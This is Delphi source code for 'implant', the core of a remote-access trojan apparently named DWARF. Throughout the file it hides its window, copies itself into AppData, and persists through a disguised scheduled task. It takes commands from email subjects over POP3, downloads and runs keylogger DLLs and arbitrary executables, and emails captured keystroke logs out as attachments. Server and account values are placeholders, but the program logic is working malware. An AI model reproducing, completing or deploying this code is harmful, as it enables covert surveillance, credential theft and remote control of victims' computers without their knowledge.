// DWARF moduled remote manipulation system
// Licensed over https://github.com/hyracan/DWARF
// Please no misuse

program implant;

uses
  Windows,
  SysUtils,
  Classes,
  ShellAPI,
  UrlMon,
  pop3send,
  ssl_openssl,
  smtpsend,
  httpsend,
  mimepart,
  synautil,
  StrUtils,
  mimemess;

const
  mail_accout   = '123@gmail.com';    
  mail_password = '123';      
  mail_server   = 'pop.123.com';             
  mailsmtpserver= 'smtp.123.com';          
  mail_port     = '995';                        


  hls1 = '123';  // libeay32
  hls2 = '123';  // ssleay32

  // Keylogger
  hello1_module = '123';

  // Keylogger-grabber
  hello2_module = '123';

  // Rootk1t
  // hellort_module = '123';

type
  LoadDll = record
    MHandleModule : THandle;
  end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
type
  TSetWindowName = procedure ();
  TSetHook = procedure ();
  TUnSetHook = procedure ();
// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

var
  Pop3sendC : TPOP3Send;
  FCmd      : String;               
  PCmd      : String;                
  PPar      : String;                
  OldCmd    : string;            
  Memes     : TMimeMess;            
  MyPath    : string;              
  LoadModule: LoadDll;            
  HThread1  : THandle;               
  ThreadId1 : Dword;               
  HThread2  : THandle;               
  ThreadID2 : Dword;                 
  KlgStart  : Boolean;                
  Mutex     : THandle;                
  Enabl     : Boolean;             
  EKLG      : Boolean;              

  {      KLG          }
  SetHook   : TSetHook;               
  UnSetHook : TUnSetHook;         
  SetWindowName : TSetWindowName;    

//{$APPTYPE CONSOLE}                  

function GetHardID:string;
var
  SerialNum: dword;
  a, b: dword;
  Buffer: array [0..255] of char;
begin
  if GetVolumeInformation('c:\', Buffer, SizeOf(Buffer), @SerialNum, a, b, nil, 0) then Result := IntToStr(SerialNum);
end;

function cmd_pars(const T_, _T, Text : string): string;
var a, b:integer;
begin
  Result := '';
  if (T_ = '') or (Text = '') or (_T = '') then Exit;
  a := pos(T_, Text);
  if a = 0 then exit;
  b := posEx(_T, Text, a);
  if b > 0 then
    Result:=Copy(Text, a + Length(T_), b - a - Length(T_));
end;

function CPars(msg_from, first_temp, two_temp : string) : string;
var
  RCmd : string;
begin
  RCmd := cmd_pars(first_temp, two_temp, msg_from);
  Result := RCmd;
end;

function GetWin(Comand: string): string;
var
  buff: array [0 .. $FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;

function Drop(SourceFile, DestFile: string): boolean;
begin
  try
    Result:=UrlDownloadToFile(nil,PChar(SourceFile),PChar(DestFile),0,nil)=0;
  except
    Result := False;
  end;
end;


procedure sendEmail(msg : string; dump1 : string);
var
  SmtpOpen : TSMTPSend;
  MsgSyn   : TMimeMess;
  MimePart : TMimePart;
  Sended   : Boolean;
begin
  SmtpOpen := TSMTPSend.Create;
  MsgSyn   := TMimeMess.Create;
  MimePart := TMimePart.Create;

  SmtpOpen.FullSSL    := True;
  SmtpOpen.TargetHost := mailsmtpserver;
  SmtpOpen.TargetPort := '465';
  SmtpOpen.UserName   := mail_accout;
  SmtpOpen.Password   := mail_password;

  if SmtpOpen.Login then
    if SmtpOpen.AuthDone then begin
     // Writeln('Auth is done.');
     // Writeln('Create message..');
     // Writeln('Server: ' + mailsmtpserver);
     // Writeln('To: ' + mail_accout);
     // Writeln('From: ' + mail_accout);
     // Writeln('Sending..');

      MsgSyn.Header.From                 := mail_accout;
      MsgSyn.Header.ToList.DelimitedText := mail_accout;
      MsgSyn.Header.Subject              := msg;

      MimePart := MsgSyn.AddPartMultipart('mixed', nil);

      if Length(dump1) > 0 then begin
      if FileExists(dump1) then

      MsgSyn.AddPartBinaryFromFile(dump1,MimePart);
      end;

      MsgSyn.EncodeMessage;

      if SmtpOpen.MailFrom(GetEmailAddr(MsgSyn.Header.From), Length(MsgSyn.Lines.Text)) then begin
        Writeln('..');
        Sended := SmtpOpen.MailTo(mail_accout);

        if Sended then begin
          SmtpOpen.MailData(MsgSyn.Lines);
        end;

      end;
      SmtpOpen.Logout;
    end else begin
      Writeln('no;(');
    end;
end;

Procedure Hide;
var
  C : THandle;
Begin
  C := FindWindow('ConsoleWindowClass', NIL);
  ShowWindow(C, SW_HIDE);
End;

var
  CFGFile : TStringList;
begin
  try
    MyPath := GetWin('%APPDATA%');

    if ParamStr(1) = '-wd' then begin

    end;

    Mutex := CreateMutex(nil, false, 'DWARFUNIQUEMUTEX085306200');
    if GetLastError = ERROR_ALREADY_EXISTS then begin
      ExitProcess(0);
    end;


    if Pos('tmpfile.exe', ParamStr(0)) <> 0 then begin

    end else begin
      CreateDir(MyPath + '\tmp');
      MyPath := MyPath + '\tmp';
      CopyFile(PChar(ParamStr(0)), PChar(MyPath + '\tmpfile.exe'), false);

      Drop(hls1, PChar(MyPath + '\libeay32.dll'));
      Drop(hls2, PChar(MyPath + '\ssleay32.dll'));

      // root
      // Drop(hellort_module, PChar(MyPath + '\srk.dll'));

      ShellExecute(0, 'open', PChar(MyPath + '\tmpfile.exe'), nil, nil, SW_HIDE);

      ShellExecute(0, 'open', 'schtasks', PChar('/create /sc MINUTE /ed 01/01/2036 /tn soundmax /tr ' + MyPath + '\tmpfile.exe'), nil, sw_hide);

      ExitProcess(0);
    end;

    //Sleep(1000);
    // LoadLibrary('srk.dll');

    AllocConsole;
    Hide;

    sendEmail('[new]{' + GetHardID + '}', '');

     Writeln('Melisara is initialize();');


    KlgStart := false;
    EKLG     := false;
    Enabl    := true;
    CFGFile  := TStringList.Create;

    Pop3sendC := TPOP3Send.Create;
    Memes := TMimeMess.Create;

    Pop3sendC.TargetHost := mail_server;
    Pop3sendC.TargetPort := mail_port;
    Pop3sendC.UserName   := mail_accout;
    Pop3sendC.Password   := mail_password;
    //Pop3sendC.AutoTLS    := true;
    Pop3sendC.FullSSL    := true;

    while Enabl = true do begin
    SetConsoleTitle('UNIQUEWINDOWNAME04921265');
    if Pop3sendC.Login then begin

      Pop3sendC.Stat;
      if Pop3sendC.Retr(Pop3sendC.StatCount) then begin
        Memes.Clear;
        Memes.Lines.Text := Pop3sendC.FullResult.Text;  
        Memes.DecodeMessage;                          
        FCmd := Memes.Header.Subject;
      end;

      PCmd := CPars(FCmd, '[', ']');
      PPar := CPars(FCmd, '{', '}');

    if OldCmd = PCmd then begin
    end else begin
      Pop3sendC.Logout;

      if PCmd = 'hello1' then begin
        // SetHook(); - Activate hook
        // UnSetHook(); - Disable hook

        CreateDir(MyPath + '\Marcomedia');

        Drop(hello1_module, PChar(MyPath + '\Marcomedia\ztmp.dll'));

        LoadModule.MHandleModule := LoadLibrary(PChar(MyPath + '\Marcomedia\ztmp.dll'));
        if LoadModule.MHandleModule <> 0 then begin
          @SetHook := GetProcAddress(LoadModule.MHandleModule, 'SetHook');
          @UnSetHook := GetProcAddress(LoadModule.MHandleModule, 'UnSetHook');
          if addr(SetHook) <> nil then begin     
            if Addr(UnSetHook) <> nil then begin 
              // SetHook();                      
                HThread1 := CreateThread (nil, 0, @SetHook, nil, 0, ThreadID1);
              KlgStart := true;
            end else begin
              //Writeln('UnSetHook(); is not found');
            end;
          end else begin
            //Writeln('SetHook(); is not found');
          end;

        end else begin
          //Writeln('DLL is not exists');
        end;

        OldCmd := PCmd;
      end else begin
        OldCmd := PCmd;
      end;

      if PCmd = 'hello2' then begin
        // SetHook(); - Activate hook
        // UnSetHook(); - Disable hook

        CreateDir(MyPath + '\Marcomedia');

        Drop(hello2_module, PChar(MyPath + '\Marcomedia\ztmp.dll'));

        LoadModule.MHandleModule := LoadLibrary(PChar(MyPath + '\Marcomedia\ztmp.dll'));
        if LoadModule.MHandleModule <> 0 then begin
          @SetHook := GetProcAddress(LoadModule.MHandleModule, 'SetHook');
          @UnSetHook := GetProcAddress(LoadModule.MHandleModule, 'UnSetHook');
          @SetWindowName := GetProcAddress(LoadModule.MHandleModule, 'SetWindowName');
          if addr(SetHook) <> nil then begin
            if Addr(UnSetHook) <> nil then begin
              // SetHook();
              CFGFile.Clear;
              CFGFile.Text := PPar;
              CFGFile.SaveToFile(MyPath + '\Marcomedia\cfg.dll');
              SetWindowName;
              HThread1 := CreateThread (nil, 0, @SetHook, nil, 0, ThreadID1);
              KlgStart := true;
            end else begin
              //Writeln('UnSetHook(); is not found');
            end;
          end else begin
            //Writeln('SetHook(); is not found');
          end;

        end else begin
          //Writeln('DLL is not exists');
        end;

        OldCmd := PCmd;
      end else begin
        OldCmd := PCmd;
      end;

      if PCmd = 'hello3' then begin
        CreateDir(MyPath + '\sndmx');
        Drop(PPar, MyPath + '\sndmx\hl3.dll');
        LoadModule.MHandleModule := LoadLibrary(PChar(MyPath + '\sndmx\hl3.dll'));

        OldCmd := PCmd;
      end else begin
        OldCmd := PCmd;
      end;

      if PCmd = 'hello4' then begin
        CreateDir(MyPath + '\Mlcosft');
        Drop(PPar, MyPath + '\Mlcosft\hl4.exe');
        ShellExecute(0, 'open', PChar(MyPath + '\sndmx\hl4.exe'), nil, nil, SW_HIDE);

        Drop(PPar, 'hl4.exe');
      end;

      if PCmd = 'hello_q' then begin
        if KlgStart = true then begin
          //UnSetHook;

          FreeLibrary(LoadModule.MHandleModule);
          sendEmail('klg-report', PChar(MyPath + '\Marcomedia\marcomd.dll'));
          DeleteFile(MyPath + '\Marcomedia\marcomd.dll');
          DeleteFile(MyPath + '\Marcomedia\ztmp.dll');
          DeleteFile(MyPath + '\Marcomedia\cfg.dll');

          RemoveDir(MyPath + '\Marcomedia');

          KlgStart := false;
        end;
        OldCmd := PCmd;
      end else begin
        OldCmd := PCmd;
      end;

      OldCmd := PCmd;
      SetConsoleTitle(PChar(PCmd + ' -> ' + oldcmd));


    end;
    Sleep(5000);
    end else begin
    end;
    end;
    Sleep(5000);
  except

  end;
end.